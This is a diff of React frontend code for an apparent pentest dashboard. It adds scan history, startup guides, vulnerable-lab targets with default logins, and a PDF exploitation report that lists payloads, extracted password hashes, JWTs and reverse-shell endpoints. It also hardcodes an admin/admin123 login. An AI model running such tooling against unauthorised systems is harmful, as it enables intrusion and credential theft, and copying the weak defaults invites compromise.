+                  <span style={{fontSize:9,background:"#78350f50",color:"#f59e0b",padding:"2px 6px",borderRadius:3}}>
+                    {cat.tools.filter(t=>t.status==="").length}
+                  </span>
+                  <span style={{fontSize:9,background:"#7f1d1d50",color:"#f87171",padding:"2px 6px",borderRadius:3}}>
+                    {cat.tools.filter(t=>t.status==="").length}
+                  </span>
+                </div>
+              </div>
+              <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:0}}>
+                {cat.tools.map((t,ti)=>(
+                  <div key={ti} style={{padding:"8px 16px",borderBottom:"1px solid #0f172a",borderRight:ti%2===0?"1px solid #0f172a":"none",display:"flex",alignItems:"flex-start",gap:8}}>
+                    <span style={{fontSize:14,flexShrink:0,marginTop:1}}>{t.status}</span>
+                    <div style={{flex:1}}>
+                      <div style={{fontSize:11,fontWeight:600,color:"#e2e8f0",marginBottom:2}}>{t.name}</div>
+                      <div style={{fontSize:9,color:"#3b82f6",fontFamily:"monospace",marginBottom:1}}>{t.tool}</div>
+                      <div style={{fontSize:9,color:"#475569"}}>{t.desc}</div>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            </div>
+          ))}
+        </div>
+      )}
+
+    {/* ── PDF CUSTOMIZATION MODAL — uses the shared PDFConfigModal ── */}
+    <PDFConfigModal open={showPDFModal} onClose={() => setShowPDFModal(false)}
+      moduleLabel="Web App Pentest Report"
+      onGenerate={cfg => { try { dlPDF(cfg); } catch(e){ alert("PDF error: " + (e.message || e)); } }}/>
+        </div>
+  );
+}
+
+function SystemHealth() {
+  const [health,setHealth] = useState(null);
+  const [loading,setLoading] = useState(true);
+  useEffect(() => {
+    api("/api/health").then(d => { setHealth(d); setLoading(false); }).catch(() => setLoading(false));
+  }, []);
+  if (loading) return <div style={{textAlign:"center",padding:40,color:"#475569",fontSize:13}}>Checking system health...</div>;
+  if (!health)  return <div style={{textAlign:"center",padding:40,color:"#ef4444"}}>Cannot connect to backend</div>;
+  const available = Object.values(health.free_tools).filter(t=>t.available).length;
+  const total     = Object.keys(health.free_tools).length;
+  return (
+    <div className="fade">
+      <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,padding:20,marginBottom:20}}>
+        <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:16,flexWrap:"wrap",gap:10}}>
+          <div>
+            <h2 style={{fontSize:16,fontWeight:700,color:"#f1f5f9",marginBottom:2}}>System Health</h2>
+            <p style={{fontSize:12,color:"#64748b"}}>Real-time tool availability on Kali backend</p>
+          </div>
+          <div style={{display:"flex",gap:8}}>
+            <Badge label={available+"/"+total+" Available"} color="green"/>
+            <Badge label={"v"+health.version} color="blue"/>
+          </div>
+        </div>
+        <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(220px,1fr))",gap:8}}>
+          {Object.entries(health.free_tools).map(([name,info]) => (
+            <div key={name} style={{background:"#020617",border:"1px solid "+(info.available?"#166534":"#7f1d1d"),borderRadius:6,padding:"10px 14px",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
+              <div>
+                <div style={{fontSize:12,fontWeight:600,color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",marginBottom:2}}>{name}</div>
+                <div style={{fontSize:10,color:"#94a3b8",fontFamily:"JetBrains Mono,monospace"}}>{info.path||"not found"}</div>
+              </div>
+              <div style={{width:8,height:8,borderRadius:"50%",background:info.available?"#22c55e":"#ef4444",flexShrink:0}}/>
+            </div>
+          ))}
+        </div>
+      </div>
+    </div>
+  );
+}
+
+function ScanHistory(props) {
+  const token = props.token;
+  const [scans,setScans] = useState([]);
+  const [clearing,setClearing] = useState(false);
+  const loadScans = () => {
+    api("/api/scans","GET",null,token).then(d=>setScans(d.scans||[])).catch(()=>{});
+  };
+  useEffect(() => { loadScans(); /* eslint-disable-next-line */ }, [token]);
+
+  const clearHistory = async () => {
+    if (!window.confirm(`Delete ALL ${scans.length} scan(s)? This cannot be undone (last daily backup is in /root/backups on the VPS).`)) return;
+    setClearing(true);
+    try {
+      const r = await api("/api/scans","DELETE",null,token);
+      if (r.ok) {
+        alert(`Cleared ${r.deleted} scan(s).`);
+        loadScans();
+      } else {
+        alert("Error clearing: " + (r.error||"unknown"));
+      }
+    } catch (e) {
+      alert("Network error: " + e.message);
+    }
+    setClearing(false);
+  };
+
+  return (
+    <div className="fade">
+      <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:8,overflow:"hidden"}}>
+        <div style={{padding:"14px 20px",borderBottom:"1px solid #1e293b",display:"flex",justifyContent:"space-between",alignItems:"center",gap:12}}>
+          <h2 style={{fontSize:15,fontWeight:600,color:"#f1f5f9"}}>Scan History</h2>
+          <div style={{display:"flex",alignItems:"center",gap:10}}>
+            <Badge label={scans.length+" scans"} color="gray"/>
+            {scans.length > 0 && (
+              <button onClick={clearHistory} disabled={clearing}
+                style={{padding:"6px 14px",fontSize:11,fontWeight:600,
+                  background:clearing?"#374151":"#dc2626",color:"#fff",
+                  border:"none",borderRadius:6,cursor:clearing?"wait":"pointer",
+                  letterSpacing:.3}}>
+                {clearing ? "Clearing..." : "Clear All"}
+              </button>
+            )}
+          </div>
+        </div>
+        {scans.length > 0 ? (
+          <table style={{width:"100%",borderCollapse:"collapse"}}>
+            <thead>
+              <tr style={{borderBottom:"1px solid #1e293b"}}>
+                {["Tool","Target","Status","Time"].map(h => (
+                  <th key={h} style={{padding:"8px 16px",textAlign:"left",fontSize:10,color:"#475569",fontWeight:600,letterSpacing:.5}}>{h}</th>
+                ))}
+              </tr>
+            </thead>
+            <tbody>
+              {scans.map((s,i) => (
+                <tr key={i} className="row" style={{borderBottom:"1px solid #0f172a",background:i%2===0?"#020617":"transparent"}}>
+                  <td style={{padding:"10px 16px",fontSize:12,color:"#60a5fa",fontFamily:"JetBrains Mono,monospace"}}>{s.tool}</td>
+                  <td style={{padding:"10px 16px",fontSize:12,color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace"}}>{s.target}</td>
+                  <td style={{padding:"10px 16px"}}><Badge label={s.status} color={s.status==="complete"?"green":"red"} size="xs"/></td>
+                  <td style={{padding:"10px 16px",fontSize:11,color:"#475569"}}>{new Date(s.timestamp).toLocaleString()}</td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        ) : <div style={{textAlign:"center",padding:40,color:"#334155",fontSize:13}}>No scans yet</div>}
+      </div>
+    </div>
+  );
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+//  GUIDE MODULE
+// ─────────────────────────────────────────────────────────────────────────────
+function GuideModule() {
+  const [tab, setTab] = useState("startup");
+  const [copied, setCopied] = useState("");
+
+  const copy = (text, key) => {
+    navigator.clipboard.writeText(text).then(() => {
+      setCopied(key);
+      setTimeout(() => setCopied(""), 2000);
+    });
+  };
+
+  const G = "#22c55e"; const DIM = "#64748b"; const BG = "#0f172a"; const CARD = "#0a1628";
+  const BORDER = "#1e293b";
+
+  const tabBtn = (id, label, icon) => (
+    <button onClick={() => setTab(id)} style={{
+      padding:"9px 20px", borderRadius:8, border:"none", cursor:"pointer", fontSize:13, fontWeight:700,
+      background: tab===id ? "#22c55e22" : "transparent",
+      color: tab===id ? G : DIM,
+      borderBottom: tab===id ? `2px solid ${G}` : "2px solid transparent",
+      transition:"all 0.2s", fontFamily:"monospace", letterSpacing:1
+    }}>{icon} {label}</button>
+  );
+
+  const CopyBtn = ({text, id}) => (
+    <button onClick={() => copy(text, id)} style={{
+      background: copied===id ? "#22c55e33" : "#1e293b",
+      border: `1px solid ${copied===id ? G : "#334155"}`,
+      color: copied===id ? G : "#94a3b8",
+      borderRadius:6, padding:"4px 12px", fontSize:11, cursor:"pointer",
+      fontFamily:"monospace", fontWeight:700, transition:"all 0.2s", whiteSpace:"nowrap"
+    }}>{copied===id ? "COPIED" : "COPY"}</button>
+  );
+
+  const Block = ({id, label, code, comment}) => (
+    <div style={{marginBottom:16}}>
+      <div style={{display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:6}}>
+        <span style={{color:G, fontWeight:700, fontSize:12, fontFamily:"monospace", letterSpacing:1}}>{label}</span>
+        <CopyBtn text={code} id={id}/>
+      </div>
+      {comment && <div style={{color:"#475569", fontSize:11, fontFamily:"monospace", marginBottom:6}}># {comment}</div>}
+      <pre style={{
+        background:"#020617", border:"1px solid #1e293b", borderRadius:8, padding:"14px 16px",
+        color:"#e2e8f0", fontSize:12, fontFamily:"'Courier New',monospace", margin:0,
+        overflowX:"auto", lineHeight:1.7, whiteSpace:"pre-wrap", wordBreak:"break-word"
+      }}>{code}</pre>
+    </div>
+  );
+
+  const LabCard = ({name, url, type, desc, color}) => (
+    <div style={{
+      background:CARD, border:`1px solid ${BORDER}`, borderRadius:10, padding:"14px 16px",
+      marginBottom:12, borderLeft:`3px solid ${color||G}`
+    }}>
+      <div style={{display:"flex", justifyContent:"space-between", alignItems:"flex-start", marginBottom:6}}>
+        <div>
+          <span style={{color:"#e2e8f0", fontWeight:700, fontSize:13}}>{name}</span>
+          <span style={{
+            marginLeft:10, background:`${color||G}22`, color:color||G,
+            borderRadius:4, padding:"2px 8px", fontSize:10, fontWeight:700, fontFamily:"monospace"
+          }}>{type}</span>
+        </div>
+        <CopyBtn text={url} id={name}/>
+      </div>
+      <div style={{color:"#94a3b8", fontSize:12, marginBottom:8}}>{desc}</div>
+      <code style={{color:G, fontSize:12, fontFamily:"monospace", background:"#020617", padding:"4px 10px", borderRadius:5}}>{url}</code>
+    </div>
+  );
+
+  const startupKali = `sudo service apache2 start
+sudo service ssh start
+sudo fuser -k 8000/tcp
+cd ~/Cyber-project
+uvicorn main:app --host 0.0.0.0 --port 8000 --reload`;
+
+  const startupWindows = `cd "C:\\Users\\vijay\\OneDrive\\Desktop\\kali\\Cyber-project"
+npm.cmd start`;
+
+  const fixEndpoints = `# Check what's in main.py
+grep "^@app.post" ~/main.py
+
+# If ffuf/nuclei/wpscan/arjun missing:
+cat ~/backend_additions.py >> ~/main.py
+
+# If commix/lfi/ssrf/xxe/etc missing:
+cat ~/backend_additions2.py >> ~/main.py
+
+# Restart backend
+sudo fuser -k 8000/tcp
+uvicorn main:app --host 0.0.0.0 --port 8000 --reload`;
+
+  const scpFiles = `# Run these on Windows in oscp-dashboard folder
+scp backend_additions.py kali@192.168.56.102:~/
+scp backend_additions2.py kali@192.168.56.102:~/`;
+
+  const killPort = `sudo fuser -k 8000/tcp
+uvicorn main:app --host 0.0.0.0 --port 8000 --reload`;
+
+  const checkLogs = `# View recent scan errors
+journalctl -u uvicorn -n 50
+# Or check terminal where uvicorn is running`;
+
+  const labs = [
+    { name:"DVWA",                   url:"http://lab_dvwa",                    type:"LIVE", desc:"Damn Vulnerable Web App — login admin/password. SQLi, XSS, CSRF, File Upload, LFI.", color:"#22c55e" },
+    { name:"WebGoat",               url:"http://lab_webgoat:8080/WebGoat",       type:"LIVE", desc:"OWASP WebGoat — guided lessons for all OWASP Top 10 vulnerabilities.", color:"#22c55e" },
+    { name:"Juice Shop",            url:"http://lab_juiceshop:3000",               type:"LIVE", desc:"OWASP Juice Shop — 100+ challenges: JWT, SQLi, IDOR, XSS, SSRF. Login admin@juice-sh.op/admin123.", color:"#22c55e" },
+    { name:"Mutillidae II",         url:"http://lab_mutillidae",                  type:"LIVE", desc:"OWASP Mutillidae — SQLi, XXE, CSRF, Clickjacking. Login admin/adminpass.", color:"#22c55e" },
+    { name:"bWAPP",                 url:"http://lab_bwapp/bWAPP/login.php",       type:"LIVE", desc:"Buggy Web App — 100+ web vulnerabilities. Login bee/bug.", color:"#22c55e" },
+    { name:"HackTheBox",             url:"https://www.hackthebox.com",                    type:"ONLINE",   desc:"Professional CTF platform. Real-world machines. Highly recommended for OSCP prep.", color:"#a855f7" },
+    { name:"TryHackMe",              url:"https://tryhackme.com",                         type:"ONLINE",   desc:"Beginner-friendly guided rooms. Great learning path for web app pentesting.", color:"#3b82f6" },
+    { name:"PentesterLab",           url:"https://pentesterlab.com",                      type:"ONLINE",   desc:"Web app security exercises. Excellent for SQLi, XSS, JWT attacks.", color:"#f59e0b" },
+    { name:"PortSwigger Web Academy",url:"https://portswigger.net/web-security",          type:"ONLINE",   desc:"Free Burp Suite labs. Industry standard for web vulnerability learning.", color:"#ef4444" },
+    { name:"VulnHub",                url:"https://www.vulnhub.com",                       type:"DOWNLOAD", desc:"Downloadable VMs. Import into VirtualBox/VMware. Great offline practice.", color:"#64748b" },
+    { name:"OWASP Juice Shop",       url:"https://juice-shop.herokuapp.com",              type:"ONLINE",   desc:"Modern vulnerable app (Node.js). Covers OWASP Top 10 2021. Has scoreboard.", color:"#f97316" },
+    { name:"Metasploitable 2",       url:"http://192.168.56.101",                         type:"LOCAL VM", desc:"Classic vulnerable Linux VM — many services exposed. Run alongside Kali.", color:"#22c55e" },
+    { name:"OWASP WebGoat (Online)", url:"https://github.com/WebGoat/WebGoat/releases",   type:"DOWNLOAD", desc:"Download .jar and run locally: java -jar webgoat.jar", color:"#64748b" },
+    { name:"HackTheBox Academy",     url:"https://academy.hackthebox.com",               type:"ONLINE",   desc:"Structured learning — Web Application Pentesting path directly maps to OSCP.", color:"#a855f7" },
+  ];
+
+  return (
+    <div style={{padding:"28px 32px", maxWidth:960, margin:"0 auto"}}>
+      <div style={{marginBottom:24}}>
+        <div style={{color:G, fontWeight:800, fontSize:22, fontFamily:"monospace", letterSpacing:2, marginBottom:4}}>RUN GUIDE & LAB TARGETS</div>
+        <div style={{color:DIM, fontSize:13}}>Copy-paste commands to start everything · Vulnerable lab URLs for testing</div>
+      </div>
+
+      {/* Tabs */}
+      <div style={{display:"flex", gap:4, borderBottom:`1px solid ${BORDER}`, marginBottom:24, flexWrap:"wrap"}}>
+        {tabBtn("startup",   "Startup",        "")}
+        {tabBtn("fix",       "Fix Endpoints",  "")}
+        {tabBtn("labs",      "Lab Targets",    "")}
+        {tabBtn("howscan",   "How Scanning Works","")}
+        {tabBtn("checklist", "Daily Checklist", "")}
+      </div>
+
+      {tab === "startup" && (
+        <div>
+          <div style={{color:"#94a3b8", fontSize:12, marginBottom:20, fontFamily:"monospace", background:"#020617", padding:"12px 16px", borderRadius:8, border:`1px solid ${BORDER}`}}>
+            Run STEP 1 (Kali) first, then STEP 2 (Windows). Always in this order.
+          </div>
+          <Block id="step1" label="STEP 1 — KALI TERMINAL" code={startupKali} comment="Paste all at once into Kali terminal. Leave it running." />
+          <Block id="step2" label="STEP 2 — WINDOWS TERMINAL" code={startupWindows} comment="Open new terminal on Windows. Browser opens automatically at localhost:3000" />
+          <Block id="kill"  label="FIX: PORT 8000 ALREADY IN USE" code={killPort} comment="Run on Kali if uvicorn says address already in use" />
+          <Block id="scp"   label="TRANSFER FILES TO KALI (Windows)" code={scpFiles} comment="Run from oscp-dashboard folder on Windows when backend files are updated" />
+          <Block id="logs"  label="CHECK BACKEND ERRORS" code={checkLogs} />
+          <div style={{background:"#0a1628", border:"1px solid #1e293b", borderRadius:10, padding:"14px 16px", marginTop:8}}>
+            <div style={{color:G, fontWeight:700, fontSize:12, fontFamily:"monospace", marginBottom:10}}>LOGIN CREDENTIALS</div>
+            <div style={{display:"flex", gap:24}}>
+              <div><span style={{color:DIM, fontSize:12}}>Username: </span><code style={{color:"#e2e8f0", fontSize:13}}>admin</code></div>
+              <div><span style={{color:DIM, fontSize:12}}>Password: </span><code style={{color:"#e2e8f0", fontSize:13}}>admin123</code></div>
+              <div><span style={{color:DIM, fontSize:12}}>API URL: </span><code style={{color:G, fontSize:13}}>{getApiUrl() || (window.location.origin + "/api")}</code></div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {tab === "fix" && (
+        <div>
+          <div style={{color:"#94a3b8", fontSize:12, marginBottom:20, fontFamily:"monospace", background:"#020617", padding:"12px 16px", borderRadius:8, border:`1px solid ${BORDER}`}}>
+            If any scan phase shows ERROR — endpoint missing, use these commands on Kali.
+          </div>
+          <Block id="fix1" label="CHECK & FIX MISSING ENDPOINTS (KALI)" code={fixEndpoints} comment="Run on Kali. Checks what's in main.py then appends missing endpoints." />
+          <div style={{background:CARD, border:`1px solid ${BORDER}`, borderRadius:10, padding:"16px 18px", marginTop:8}}>
+            <div style={{color:G, fontWeight:700, fontSize:12, fontFamily:"monospace", marginBottom:12}}>ENDPOINT REFERENCE — ALL 25 PHASES</div>
+            <div style={{display:"grid", gridTemplateColumns:"1fr 1fr", gap:6}}>
+              {[
+                ["wafw00f","backend_additions.py"],["whatweb","main.py"],["cms","main.py"],
+                ["nmap","main.py"],["ssl","main.py"],["headers","main.py"],
+                ["cookies","main.py"],["cors","main.py"],["gobuster","main.py"],
+                ["subdomains","main.py"],["xss","main.py"],["nikto","main.py"],
+                ["sqlmap","main.py"],["dns","main.py"],["ffuf","backend_additions.py"],
+                ["commix","backend_additions2.py"],["lfi","backend_additions2.py"],["openredirect","backend_additions2.py"],
+                ["sensitivefiles","backend_additions2.py"],["hydra","backend_additions2.py"],["ssrf","backend_additions2.py"],
+                ["xxe","backend_additions2.py"],["clickjacking","backend_additions2.py"],["verbtamper","backend_additions2.py"],
+                ["pollution","backend_additions2.py"],
+              ].map(([ep, file]) => (
+                <div key={ep} style={{display:"flex", justifyContent:"space-between", padding:"5px 10px", background:"#020617", borderRadius:6, fontSize:11, fontFamily:"monospace"}}>
+                  <span style={{color:G}}>/{ep}</span>
+                  <span style={{color:DIM}}>{file}</span>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+      )}
+
+      {tab === "labs" && (
+        <div>
+          <div style={{color:"#94a3b8", fontSize:12, marginBottom:20, fontFamily:"monospace", background:"#020617", padding:"12px 16px", borderRadius:8, border:`1px solid ${BORDER}`}}>
+            Click COPY next to any URL then paste into the scanner target field. Local targets need Kali VM running.
+          </div>
+          <div style={{display:"flex", gap:10, marginBottom:16, flexWrap:"wrap"}}>
+            {[["LOCAL","#22c55e"],["ONLINE","#a855f7"],["DOWNLOAD","#64748b"],["LOCAL VM","#22c55e"]].map(([t,c])=>(
+              <div key={t} style={{background:`${c}22`, color:c, borderRadius:6, padding:"3px 12px", fontSize:11, fontWeight:700, fontFamily:"monospace"}}>{t}</div>
+            ))}
+            <div style={{color:DIM, fontSize:11, alignSelf:"center", fontFamily:"monospace"}}>— color legend</div>
+          </div>
+          {labs.map((l,i) => <LabCard key={i} {...l}/>)}
+        </div>
+      )}
+
+      {tab === "checklist" && (
+        <div>
+          <div style={{color:"#94a3b8", fontSize:12, marginBottom:20, fontFamily:"monospace", background:"#020617", padding:"12px 16px", borderRadius:8, border:`1px solid ${BORDER}`}}>
+            Run through this every session before scanning.
+          </div>
+          {[
+            { step:"01", title:"Start VirtualBox", detail:"Open VirtualBox -> Start Kali VM -> Wait for desktop", ok:true },
+            { step:"02", title:"Start Apache2 on Kali", detail:"sudo service apache2 start", code:true },
+            { step:"03", title:"Start SSH on Kali",     detail:"sudo service ssh start", code:true },
+            { step:"04", title:"Kill port 8000",         detail:"sudo fuser -k 8000/tcp", code:true },
+            { step:"05", title:"Start backend",          detail:"cd ~/Cyber-project && uvicorn main:app --host 0.0.0.0 --port 8000 --reload", code:true },
+            { step:"06", title:"Start frontend (Windows)", detail:'cd "C:\\Users\\vijay\\OneDrive\\Desktop\\kali\\Cyber-project" && npm.cmd start', code:true },
+            { step:"07", title:"Verify backend alive",   detail:"Open http://YOUR-VPS-IP:8000/docs (or http://localhost:8000/docs) — should show FastAPI UI", ok:true },
+            { step:"08", title:"Login",                   detail:"http://localhost:3000 -> admin / admin123", ok:true },
+            { step:"09", title:"Set target",              detail:"Paste target URL e.g. http://lab_dvwa/dvwa (DVWA Docker)", ok:true },
+            { step:"10", title:"Run Full Scan (25 phases)", detail:"Click Web App Pentesting -> Run Full Scan -> Wait ~5 min", ok:true },
+            { step:"11", title:"Generate PDF",            detail:"Click Generate PDF Report after scan completes", ok:true },
+          ].map(({step, title, detail, code}) => (
+            <div key={step} style={{
+              background:CARD, border:`1px solid ${BORDER}`, borderRadius:10,
+              padding:"14px 18px", marginBottom:10, display:"flex", gap:14, alignItems:"flex-start"
+            }}>
+              <div style={{
+                width:32, height:32, borderRadius:8, background:"#22c55e22", border:`1px solid ${G}`,
+                display:"flex", alignItems:"center", justifyContent:"center",
+                color:G, fontWeight:800, fontSize:12, fontFamily:"monospace", flexShrink:0
+              }}>{step}</div>
+              <div style={{flex:1}}>
+                <div style={{color:"#e2e8f0", fontWeight:700, fontSize:13, marginBottom:4}}>{title}</div>
+                {code
+                  ? <div style={{display:"flex", gap:10, alignItems:"center"}}>
+                      <code style={{color:G, fontSize:11, fontFamily:"monospace", background:"#020617", padding:"4px 10px", borderRadius:5, flex:1}}>{detail}</code>
+                      <CopyBtn text={detail} id={`c${step}`}/>
+                    </div>
+                  : <div style={{color:DIM, fontSize:12}}>{detail}</div>
+                }
+              </div>
+            </div>
+          ))}
+        </div>
+      )}
+    </div>
+  );
+}
+
+function ComingSoon(props) {
+  const topic = props.topic;
+  if (!topic) return null;
+  return (
+    <div className="fade" style={{textAlign:"center",padding:"80px 20px"}}>
+      <div style={{fontSize:48,marginBottom:12}}>{topic.icon}</div>
+      <h2 style={{fontSize:20,fontWeight:700,color:"#f1f5f9",marginBottom:6}}>{topic.label}</h2>
+      <p style={{fontSize:13,color:"#475569",marginBottom:30}}>Module under development</p>
+    </div>
+  );
+}
 
 // ── COMPREHENSIVE PDF REPORT FOR ALL MODULE SHELL MODULES ─────
 function generateShellReport({title, icon, target, attacks, results}) {
@@ -14724,6 +17161,960 @@ const BOF_PHASES = [
 // no HTTP-stager dependencies, no timing races. They either succeed
 // reliably or return a clear actionable error.
 
+function generateExploitReport({results, date, pdfConfig}) {
+  const _cfg = pdfConfig || {};
+  const _go = () => {
+    const _pwd = _cfg.password, _encrypt = _cfg.encrypt !== false && _pwd;
+    const doc = new jsPDF({unit:"mm", format:"a4",
+      ...(_encrypt ? {encryption: {userPassword: _pwd, ownerPassword: _pwd,
+        userPermissions: ["print","modify","copy","annot-forms"]}} : {})
+    });
+    const pageW = doc.internal.pageSize.getWidth();
+    const pageH = doc.internal.pageSize.getHeight();
+    const margin = 15;
+    const contentW = pageW - 2*margin;
+    let y = 0;
+    const BLUE = [37,99,235], DARK=[15,23,42], GRAY=[100,116,139],
+          GREEN=[22,163,74], RED=[220,38,38], LIGHT=[241,245,249];
+    const txt = (s, x, py, sz=10, c=DARK, bold=false, align="left") => {
+      doc.setFont("Arial", bold?"bold":"normal"); doc.setFontSize(sz);
+      doc.setTextColor(...c); doc.text(String(s||""), x, py, {align});
+    };
+    const fillR = (x, py, w, h, c) => { doc.setFillColor(...c); doc.rect(x, py, w, h, "F"); };
+    const chk = (h) => { if (y + h > pageH - 18) { footer(); doc.addPage(); y = 20; header(); } };
+    const header = () => {
+      txt("VulnusLab — Exploitation Report", margin, 10, 7, GRAY);
+      txt(date, pageW-margin, 10, 7, GRAY, false, "right");
+    };
+    const footer = () => {
+      txt("VulnusLab | CONFIDENTIAL · vulnuslab.com", margin, pageH-7, 7, BLUE);
+      txt("support@vulnuslab.com", pageW-margin, pageH-7, 7, BLUE, false, "right");
+    };
+    // ── COVER ──
+    fillR(0, 0, pageW, 60, [11,15,30]);
+    txt("V", pageW/2-5, 22, 14, [248,250,252], true, "center");
+    txt("VULNUS LAB", pageW/2, 33, 11, [248,250,252], true, "center");
+    txt("EXPLOITATION REPORT", pageW/2, 48, 22, BLUE, true, "center");
+    txt("Active Exploitation Findings", pageW/2, 56, 9, GRAY, false, "center");
+    y = 75;
+    // ── Summary table ──
+    const totalRun = results.length;
+    const succ = results.filter(r => r.ok).length;
+    fillR(margin, y, contentW, 7, BLUE);
+    txt("RESULT SUMMARY", margin+3, y+5, 9, [255,255,255], true);
+    y += 7;
+    [["Exploits Run", String(totalRun)],
+     ["Successful Compromises", String(succ)],
+     ["Generated", date],
+     ["Classification", "CONFIDENTIAL"]].forEach((row, i) => {
+       fillR(margin, y, contentW, 7, i%2===0?LIGHT:[255,255,255]);
+       txt(row[0], margin+3, y+5, 8.5, GRAY, true);
+       txt(row[1], margin+60, y+5, 8.5, DARK);
+       y += 7;
+     });
+    y += 6;
+
+    // ── TRUST STATEMENT (vulntemplate block 3) ──
+    const LBLUE = [220,230,245];
+    fillR(margin, y, contentW, 16, LBLUE);
+    fillR(margin, y, 3, 16, BLUE);
+    doc.setFont("Arial","bold"); doc.setFontSize(9); doc.setTextColor(...BLUE);
+    doc.text("VERIFIED BY VULNUSLAB", margin+8, y+6);
+    doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...DARK);
+    doc.text("Every exploit listed below was executed against the live target and either succeeded (shell/data extracted)", margin+8, y+11);
+    doc.text("or failed with a captured stack trace. No theoretical claims — only verified outcomes.", margin+8, y+14);
+    y += 22;
+
+    // ── Per-exploit findings ──
+    results.forEach((r, i) => {
+      chk(40);
+      const status = r.ok ? "COMPROMISED" : "FAILED";
+      const stColor = r.ok ? GREEN : RED;
+      fillR(margin, y, contentW, 9, stColor);
+      txt(`${i+1}. ${r.exploit?.name || r.exploit_id}`, margin+3, y+6, 10, [255,255,255], true);
+      txt(status, pageW-margin-3, y+6, 9, [255,255,255], true, "right");
+      y += 11;
+      const rows = [
+        ["CVE / Reference", r.exploit?.cve || r.cve || "—"],
+        ["CVSS", String(r.exploit?.cvss || "—")],
+        ["Target", `${r.target||"—"}:${r.exploit?.port||"—"}`],
+        ["Service", r.exploit?.service || "—"],
+        ["Category", r.exploit?.category || "—"],
+      ];
+      rows.forEach((row, idx) => {
+        fillR(margin, y, contentW, 6, idx%2===0?LIGHT:[255,255,255]);
+        txt(row[0], margin+3, y+4.5, 8, GRAY, true);
+        txt(row[1], margin+55, y+4.5, 8, DARK);
+        y += 6;
+      });
+      y += 2;
+      // Description
+      fillR(margin, y, contentW, 5.5, [219,234,254]);
+      txt("Description", margin+3, y+4, 8, BLUE, true);
+      y += 6;
+      const desc = doc.splitTextToSize(r.exploit?.description || "—", contentW-6);
+      desc.forEach(line => {
+        chk(5); txt(line, margin+3, y+3.5, 8, DARK); y += 5;
+      });
+      y += 2;
+      // Evidence / Error
+      const evColor = r.ok ? [220,252,231] : [254,226,226];
+      const evHead = r.ok ? "Evidence of Compromise" : "Failure Reason";
+      const evText = r.ok ? (r.evidence || r.message || "Shell session opened.") : (r.error || "Unknown error");
+      fillR(margin, y, contentW, 5.5, evColor);
+      txt(evHead, margin+3, y+4, 8, r.ok ? GREEN : RED, true);
+      y += 6;
+      const ev = doc.splitTextToSize(evText, contentW-6);
+      ev.forEach(line => {
+        chk(5); txt(line, margin+3, y+3.5, 8, DARK); y += 5;
+      });
+      y += 2;
+      // Code-aware line wrap so long unbroken strings don't get truncated
+      // mid-character the way splitTextToSize handles them.
+      const wrapCode = (s, lineLen) => {
+        const out = [];
+        let cur = String(s || "");
+        while (cur.length > lineLen) {
+          let cut = cur.lastIndexOf(" ", lineLen);
+          if (cut < lineLen * 0.5) cut = lineLen;  // hard break for no-space runs
+          out.push(cur.substring(0, cut));
+          cur = cur.substring(cut).replace(/^\s+/, "");
+        }
+        if (cur) out.push(cur);
+        return out;
+      };
+      const codeBlock = (heading, headColor, bgColor, body) => {
+        if (!body) return;
+        fillR(margin, y, contentW, 5.5, bgColor);
+        txt(heading, margin+3, y+4, 8, headColor, true);
+        y += 6;
+        const lines = wrapCode(body, 100);
+        lines.forEach(line => {
+          chk(5);
+          doc.setFont("Courier","normal"); doc.setFontSize(7.5); doc.setTextColor(...DARK);
+          doc.text(line, margin+3, y+3.5); y += 4.5;
+        });
+        doc.setFont("Arial", "normal");
+        y += 2;
+      };
+
+      // Payload
+      if (r.payload) codeBlock("Payload", [180,83,9], [254,243,199], r.payload);
+
+      // Extracted data table — user/hash pairs for SQLi exploits
+      if (r.ok && Array.isArray(r.rows) && r.rows.length > 0) {
+        chk(20);
+        fillR(margin, y, contentW, 5.5, [243,232,255]);
+        txt(`Extracted Records (${r.rows.length})`, margin+3, y+4, 8, [109,40,217], true);
+        y += 6;
+        // Table header
+        fillR(margin, y, contentW, 5, [221,214,254]);
+        txt("Username", margin+3, y+3.5, 7.5, DARK, true);
+        txt("Hash / Password", margin+60, y+3.5, 7.5, DARK, true);
+        y += 5;
+        r.rows.slice(0, 20).forEach((row, idx) => {
+          chk(5);
+          fillR(margin, y, contentW, 4.5, idx%2===0 ? LIGHT : [255,255,255]);
+          doc.setFont("Courier","normal"); doc.setFontSize(7); doc.setTextColor(...DARK);
+          doc.text(String(row[0]||"").substring(0,28), margin+3, y+3.2);
+          doc.text(String(row[1]||"").substring(0,68), margin+60, y+3.2);
+          y += 4.5;
+        });
+        if (r.rows.length > 20) {
+          chk(5);
+          doc.setFont("Arial","italic"); doc.setFontSize(7); doc.setTextColor(...GRAY);
+          doc.text(`… and ${r.rows.length - 20} more records (truncated for readability)`, margin+3, y+3);
+          y += 5;
+        }
+        doc.setFont("Arial", "normal");
+        y += 3;
+      }
+
+      // Extracted JWT — Juice Shop auth bypass
+      if (r.ok && r.jwt) codeBlock("Extracted JSON Web Token", [180,83,9], [254,243,199], r.jwt);
+
+      // Shell verification output (vsftpd, DVWA cmdi etc.) — only if not
+      // already covered by Evidence line. We mine the evidence string for
+      // an `id` output if present.
+      if (r.ok && r.shell_target && r.shell_port) {
+        codeBlock("Reverse-Shell Endpoint", [22,163,74], [220,252,231],
+                  `${r.shell_target}:${r.shell_port}  (shell session id: ${r.shell_id})`);
+      }
+
+      y += 4;
+    });
+    // ── APPENDIX (vulntemplate block 11) ──
+    chk(80);
+    fillR(margin, y, contentW, 9, [220,230,245]);
+    doc.setFont("Arial","bold"); doc.setFontSize(10); doc.setTextColor(...BLUE);
+    doc.text("Appendix", margin+4, y+6); y+=13;
+
